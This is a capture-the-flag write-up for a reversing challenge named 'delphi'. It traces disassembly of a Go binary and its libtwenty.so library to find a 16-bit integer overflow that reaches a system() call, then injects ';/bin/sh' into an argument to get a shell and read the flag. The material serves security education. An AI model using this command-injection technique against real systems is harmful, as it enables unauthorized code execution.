
files given:

* delphi-07a5c9d07a4c20ae81a2ddc66b9602d0dcceb74b
* libtwenty.so-4a3918b2efd9fbdfd20eeb8fa51ca76bc42eb2f2

TL;DR

* Reverse Command Protocol
* Integer Overflow
* Metacharacter Injection

First we identify what type of binary we are dealing with:
{% highlight bash lineanchors %}
➜  yvr  file delphi
delphi: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.32, BuildID[sha1]=0x936b88708739382f1d376e89a4b82a4248d19b08, not stripped
{% endhighlight %}

Running objdump -t delphi, we can see some symbols of the binary and from these we can conclude it is a compiled Golang program:
{% highlight bash lineanchors %}
➜  yvr  objdump -t delphi | grep go
0000000000506920 l    d  .gopclntab	0000000000000000              .gopclntab
0000000000754ff0 l    d  .got	0000000000000000              .got
0000000000755000 l    d  .got.plt	0000000000000000              .got.plt
0000000000000000 l    df *ABS*	0000000000000000              _cgo_export.c
0000000000000000 l    df *ABS*	0000000000000000              main.cgo2.c
0000000000000000 l    df *ABS*	0000000000000000              _cgo_export.c
0000000000000000 l    df *ABS*	0000000000000000              cgo.cgo2.c
0000000000000000 l    df *ABS*	0000000000000000              /var/tmp/go-link-Sk9whB/go.o
00000000004f5138 l     O .rodata	0000000000000000              go.func.*
00000000004d37c0 l     O .rodata	0000000000000000              go.string.*
...
{% endhighlight %}

Now we have to make sure our system finds the libtwenty.so object file (just add the directory where you have libtwenty.so to the `LD_LIBRARY_PATH` environment variable):
{% highlight bash lineanchors %}
➜  yvr  export LD_LIBRARY_PATH=$(pwd)
{% endhighlight %}

So when we run this program, we are prompted with:
{% highlight bash lineanchors %}
➜  yvr  ./delphi 
Welcome!

Are you ready to play 20 questions? No? Perfect!
Im thinking of something big, metal, and orange. Go!
>
{% endhighlight %}
OK, so we have a place to input data... let's first look for a place we can latch onto:

{% highlight nasm lineanchors %}
➜  yvr  objdump -t delphi | grep main
0000000000000000 l    df *ABS*	0000000000000000              main.cgo2.c
0000000000504ff8 l     O .rodata	0000000000000008              runtime.main.f
00000000005050d0 l     O .rodata	0000000000000010              go.importpath.main.
000000000076d164 l     O .noptrbss	0000000000000001              main.initdone.
0000000000505ae0 l     O .rodata	0000000000000060              main.statictmp_0021
0000000000401280 l     F .text	00000000000009b0              main.main
0000000000401c30 l     F .text	00000000000001c0              main.doTheMagic
0000000000401df0 l     F .text	0000000000000070              main.init
00000000004021c0 l     F .text	0000000000000070              main._Cfunc_CString
0000000000402230 l     F .text	0000000000000040              main._Cfunc_check_answer
0000000000402270 l     F .text	0000000000000040              main._Cfunc_free
0000000000411b20 l     F .text	0000000000000170              runtime.main
0000000000000000       F *UND*	0000000000000000              __libc_start_main@@GLIBC_2.2.5
00000000004295b0 g     F .text	0000000000000010              main
{% endhighlight %}

Alright so we found main (really main.main, since this is a Golang program), and we also found a function "main.doTheMagic", interesting... let's try to see if we can get there.

We first find where our input is being read in:
{% highlight nasm lineanchors %}
   0x401747 <main.main+1223>:	mov    QWORD PTR [rsp+0x48],rax
   0x40174c <main.main+1228>:	mov    rbx,QWORD PTR [rsp+0x48]
   0x401751 <main.main+1233>:	mov    QWORD PTR [rsp],rbx
=> 0x401755 <main.main+1237>:	call   0x42cf70 <bufio.(*Scanner).Scan>
   0x40175a <main.main+1242>:	movzx  rbx,BYTE PTR [rsp+0x8]
   0x401760 <main.main+1248>:	cmp    bl,0x0
   0x401763 <main.main+1251>:	je     0x4018b1 <main.main+1585>
   0x401769 <main.main+1257>:	mov    rdi,QWORD PTR [rsp+0x48]
{% endhighlight %}

If we continue to step (Whenever I debug, I can't help but think about Vampire Weekend's Step, naturally that is on a loop when I'm doing this :D), we end up here:
{% highlight nasm lineanchors %}
[----------------------------------registers-----------------------------------]
RAX: 0x2 
RBX: 0x4d7f60 --> 0x4d7f70 --> 0x6f67 ('go')
RDX: 0xa ('\n')
RSI: 0x4d7f70 --> 0x6f67 ('go')
RDI: 0xc208000270 ("TEST INPUT")
[-------------------------------------code-------------------------------------]
   0x401939 <main.main+1721>:	mov    rax,QWORD PTR [rbx+0x8]
   0x40193d <main.main+1725>:	mov    QWORD PTR [rsp+0x90],rdx
   0x401945 <main.main+1733>:	mov    QWORD PTR [rsp+0xb0],rax
=> 0x40194d <main.main+1741>:	cmp    rdx,rax                     ; Compares the length of "go" to our input
   0x401950 <main.main+1744>:	jl     0x401baa <main.main+2346>   ; Go somewhere else if our input's length is < 2
   0x401956 <main.main+1750>:	cmp    rdx,rax                     
   0x401959 <main.main+1753>:	jb     0x401bb2 <main.main+2354>    
   0x40195f <main.main+1759>:	mov    QWORD PTR [rsp+0xb8],rdi
{% endhighlight %}

Alright, so it compares the length of our input to 2 and if it is smaller then it will presumablely quit. 

Moving forward...
{% highlight nasm lineanchors %}
[----------------------------------registers-----------------------------------]
RAX: 0x2 
RSI: 0x4d7f70 --> 0x6f67 ('go')
RDI: 0xc208000270 ("TEST INPUT")
[-------------------------------------code-------------------------------------]
   0x40197c <main.main+1788>:	mov    QWORD PTR [rsp+0x8],rax
   0x401981 <main.main+1793>:	mov    QWORD PTR [rsp+0x10],rsi
   0x401986 <main.main+1798>:	mov    QWORD PTR [rsp+0x18],rax
=> 0x40198b <main.main+1803>:	call   0x425600 <runtime.eqstring>
   0x401990 <main.main+1808>:	movzx  rbx,BYTE PTR [rsp+0x20]
   0x401996 <main.main+1814>:	cmp    bl,0x0
   0x401999 <main.main+1817>:	je     0x401baa <main.main+2346>
   0x40199f <main.main+1823>:	mov    rax,0x1
{% endhighlight %}

So it looks like the program checks to make sure the first two characters of the string are "go", so let's give that a try to see if anything different happens:
{% highlight bash lineanchors %}
➜  yvr  ./delphi 
Welcome!

Are you ready to play 20 questions? No? Perfect!
Im thinking of something big, metal, and orange. Go!
> go
Sneaky, sneaky. Go where? How fast?
> something else
Whos that?
> asdfasdf
Whos that?
> asdfasdfasd
Maybe? Hmmm.
> 
{% endhighlight %}

So "go" is definetly what we want for the first part of our payload.

Let's see where this takes us now...
{% highlight nasm lineanchors %}
   0x401a04 <main.main+1924>:	mov    QWORD PTR [rsp],rcx
   0x401a08 <main.main+1928>:	mov    QWORD PTR [rsp+0x70],rax
   0x401a0d <main.main+1933>:	mov    QWORD PTR [rsp+0x8],rax
=> 0x401a12 <main.main+1938>:	call   0x401c30 <main.doTheMagic>
   0x401a17 <main.main+1943>:	lea    rbx,ds:0x4d4060
   0x401a1f <main.main+1951>:	mov    rbp,QWORD PTR [rbx]
   0x401a22 <main.main+1954>:	mov    QWORD PTR [rsp+0xd8],rbp
   0x401a2a <main.main+1962>:	mov    rbp,QWORD PTR [rbx+0x8]
{% endhighlight %}

Sweet :D, we can get to the magic function now...
{% highlight nasm lineanchors %}
   0x401c77 <main.doTheMagic+71>:	mov    rdi,rbp
   0x401c7a <main.doTheMagic+74>:	movs   QWORD PTR es:[rdi],QWORD PTR ds:[rsi]
   0x401c7c <main.doTheMagic+76>:	movs   QWORD PTR es:[rdi],QWORD PTR ds:[rsi]
=> 0x401c7e <main.doTheMagic+78>:	call   0x44a480 <strings.Split>
   0x401c83 <main.doTheMagic+83>:	mov    rdx,QWORD PTR [rsp+0x20]
   0x401c88 <main.doTheMagic+88>:	mov    rax,QWORD PTR [rsp+0x28]
   0x401c8d <main.doTheMagic+93>:	mov    rcx,QWORD PTR [rsp+0x30]
   0x401c92 <main.doTheMagic+98>:	mov    QWORD PTR [rsp+0x68],rdx
Guessed arguments:
arg[0]: 0x7ffff7e26d40 --> 0x8 
arg[1]: 0x4d37d0 --> 0x20 (' ')
{% endhighlight %}

So it looks like our input is being split on spaces. We need to see how many parameters this thing expects...
{% highlight nasm lineanchors %}
   0x0000000000401ca1 <+113>:	cmp    rax,0x1
   0x0000000000401ca5 <+117>:	jne    0x401d57 <main.doTheMagic+295>
   ...
   0x0000000000401d57 <+295>:	cmp    rax,0x3
   0x0000000000401d5b <+299>:	jne    0x401dd2 <main.doTheMagic+418>
   ...
{% endhighlight %}

If you take into consideration the control flow going on here, and taking a peak at the bottom of our magic function:
{% highlight nasm lineanchors %}
   0x0000000000401dbf <+399>:	call   0x402230 <main._Cfunc_check_answer>
{% endhighlight %}

It seems to me we want to go into that function and in order to do that we would have to have `rax == 3`. Since we know the value in rax is controlled by our split function's return value, we are going to have 3 parameters in our payload, one of them being "go". Thus, it will look something like this:
{% highlight bash lineanchors %}
go <something> <something>
{% endhighlight %}

Alright, so let's checkout the check answer function:
{% highlight nasm lineanchors %}
   0x0000000000402230 <+0>:	mov    rcx,QWORD PTR fs:0xfffffffffffffff0
   0x0000000000402239 <+9>:	cmp    rsp,QWORD PTR [rcx]
   0x000000000040223c <+12>:	ja     0x402245 <main._Cfunc_check_answer+21>
   0x000000000040223e <+14>:	call   0x428280 <runtime.morestack16_noctxt>
   0x0000000000402243 <+19>:	jmp    0x402230 <main._Cfunc_check_answer>
   0x0000000000402245 <+21>:	sub    rsp,0x10
   0x0000000000402249 <+25>:	mov    eax,0x400f80
   0x000000000040224e <+30>:	mov    QWORD PTR [rsp],rax
   0x0000000000402252 <+34>:	lea    rax,[rsp+0x18]
   0x0000000000402257 <+39>:	mov    QWORD PTR [rsp+0x8],rax
   0x000000000040225c <+44>:	call   0x404da0 <runtime.cgocall>
   0x0000000000402261 <+49>:	add    rsp,0x10
   0x0000000000402265 <+53>:	ret    
   0x0000000000402266 <+54>:	add    BYTE PTR [rax],al
   0x0000000000402268 <+56>:	add    BYTE PTR [rax],al
   0x000000000040226a <+58>:	add    BYTE PTR [rax],al
   0x000000000040226c <+60>:	add    BYTE PTR [rax],al
   0x000000000040226e <+62>:	add    BYTE PTR [rax],al
{% endhighlight %}

Looks like this function calls this function: 0x400f80. I guess we should check that out then:
{% highlight nasm lineanchors %}
   0x0000000000400f80 <+0>:	mov    rsi,QWORD PTR [rdi+0x8]
   0x0000000000400f84 <+4>:	mov    edi,DWORD PTR [rdi]
   0x0000000000400f86 <+6>:	jmp    0x400de0 <check_answer@plt>
{% endhighlight %}

Well then, I guess our check_answer function is really apart of that libtwenty.so shared object file since we see our program using the plt to call it. 

What is inside this check_answer function?
{% highlight nasm lineanchors %}
   ...
   0x00007ffff7bd87d7 <+127>:	call   0x7ffff7bd8650 <strcat@plt>
   0x00007ffff7bd87dc <+132>:	lea    rax,[rbp-0x90]
   0x00007ffff7bd87e3 <+139>:	mov    rdi,rax
   0x00007ffff7bd87e6 <+142>:	call   0x7ffff7bd8630 <system@plt>
   ...
{% endhighlight %}

Ooo, a strcat and system call as well as no input validation... interesting... let's try to see if we can get there:
{% highlight nasm lineanchors %}
   ...
   0x00007ffff7bd8770 <+24>:	mov    WORD PTR [rbp-0x2],0x2a           ; Move 42 into rbp-0x2 (let's call this var1)
   0x00007ffff7bd8776 <+30>:	lea    rax,[rbp-0x90]                    ; Load the address rbp-0x90 into rax
   0x00007ffff7bd877d <+37>:	mov    DWORD PTR [rax],0x6f686365        ; Put "echo" at rax
   0x00007ffff7bd8783 <+43>:	mov    WORD PTR [rax+0x4],0x20           ; Put 32 at rax+4
   0x00007ffff7bd8789 <+49>:	mov    eax,DWORD PTR [rbp-0x94]          ; Put our parsed second parameter into eax (found this out with a little more reversing)
   0x00007ffff7bd878f <+55>:	add    WORD PTR [rbp-0x2],ax             ; Add rbp-0x2 (assigned to be 42) and our number and put back into rbp-0x2
   0x00007ffff7bd8793 <+59>:	movzx  eax,WORD PTR [rbp-0x2]            ; Put rbp-0x2 into eax
   0x00007ffff7bd8797 <+63>:	cmp    eax,0x4                           ; Compare our sum of input + 42 to 4
   0x00007ffff7bd879a <+66>:	ja     0x7ffff7bd87ed <check_answer+149> ; If the sum is above 4, then exit check_answer
   ...
{% endhighlight %}

So here is where our control flow can take either the red or blue pill and we want the "ja" to fail so we don't end up at the end of the function, but instead in this interesting piece of code:
{% highlight nasm lineanchors %}
   ...
   0x00007ffff7bd879c <+68>:	mov    eax,eax
   0x00007ffff7bd879e <+70>:	lea    rdx,[rax*4+0x0]
   0x00007ffff7bd87a6 <+78>:	lea    rax,[rip+0xff]        # 0x7ffff7bd88ac
   0x00007ffff7bd87ad <+85>:	mov    eax,DWORD PTR [rdx+rax*1]
   0x00007ffff7bd87b0 <+88>:	movsxd rdx,eax
   0x00007ffff7bd87b3 <+91>:	lea    rax,[rip+0xf2]        # 0x7ffff7bd88ac
   0x00007ffff7bd87ba <+98>:	add    rax,rdx
   0x00007ffff7bd87bd <+101>:	jmp    rax
   ...
{% endhighlight %}

Which does some calculation stuff and then jumps to rax. OK, so in our comparison code we take 42 and add it to our second parameter. At this point we can guess our payload will look something like this:
{% highlight bash lineanchors %}
go <something> <number>
{% endhighlight %}

So if we start with 42 and add the number we specified, how can we get that to be less than or equal to 4? Hmmm... well an integer overflow would sure do the trick :D This assembly actually looks really funky, like why would you use the ax register and add it to WORD [rbp-0x2] and compare 4 to the WORD [rbp-0x2]? Since a WORD is only two bytes, if we send in the maximum value of a WORD and add it to any value, the carry bit is going to be discarded because we will have exceeded the size of a WORD. So what if we send the largest size of a WORD - 42 == 2^16 - 42 == 65494?
{% highlight nasm lineanchors %}
[----------------------------------registers-----------------------------------]
RAX: 0x0 
[-------------------------------------code-------------------------------------]
   0x7ffff7bd8789 <check_answer+49>:	mov    eax,DWORD PTR [rbp-0x94]
   0x7ffff7bd878f <check_answer+55>:	add    WORD PTR [rbp-0x2],ax
   0x7ffff7bd8793 <check_answer+59>:	movzx  eax,WORD PTR [rbp-0x2]
=> 0x7ffff7bd8797 <check_answer+63>:	cmp    eax,0x4
   0x7ffff7bd879a <check_answer+66>:	ja     0x7ffff7bd87ed <check_answer+149>
   0x7ffff7bd879c <check_answer+68>:	mov    eax,eax
   0x7ffff7bd879e <check_answer+70>:	lea    rdx,[rax*4+0x0]
   0x7ffff7bd87a6 <check_answer+78>:	lea    rax,[rip+0xff]        # 0x7ffff7bd88ac
{% endhighlight %}

Woah, eax is 0! So now we are going to hit that weird jump code. Now the question is, what does eax have to be to get the system code to be called? Well we could do the math here, or since we know eax can only be 0, 1, 2 or 4 we could just try setting eax to be those different numbers until we get it to work :D
{% highlight bash lineanchors %}
➜  yvr  ./delphi 
Welcome!

Are you ready to play 20 questions? No? Perfect!
Im thinking of something big, metal, and orange. Go!
> go asdf 65494    # 2^16 - 42 + 0 == 65494 means eax = 0
> go asdf 65495    # 2^16 - 42 + 1 == 65495 means eax = 1
> go asdf 65496    # 2^16 - 42 + 2 == 65496 means eax = 2
> go asdf 65497    # 2^16 - 42 + 3 == 65497 means eax = 3
> go asdf 65498    # 2^16 - 42 + 4 == 65498 means eax = 4
asdf
> 
{% endhighlight %}

Boom! So we got that system call to be executed and all it does right now is "echo <our string>". But if you look at the code again, it simply concatinates the 2nd part of our payload to the echo without checking for special characters, meaning we can just put a semicolon and execute arbituary commands :D
{% highlight bash lineanchors %}
➜  yvr  ./delphi
Welcome!

Are you ready to play 20 questions? No? Perfect!
Im thinking of something big, metal, and orange. Go!
> go asdf;/bin/sh 65498
asdf
$ cat flag.txt
flag{something or other}  # Not the actual flag, running locally
$ 
{% endhighlight %}

Not too bad of a challenge, really was more reversing than actually exploitation. So when it all boils down, you have to reverse a basic command protocol, exploit an integer overflow and use metacharacter injection. For 200 points I would say that is reasonable :D
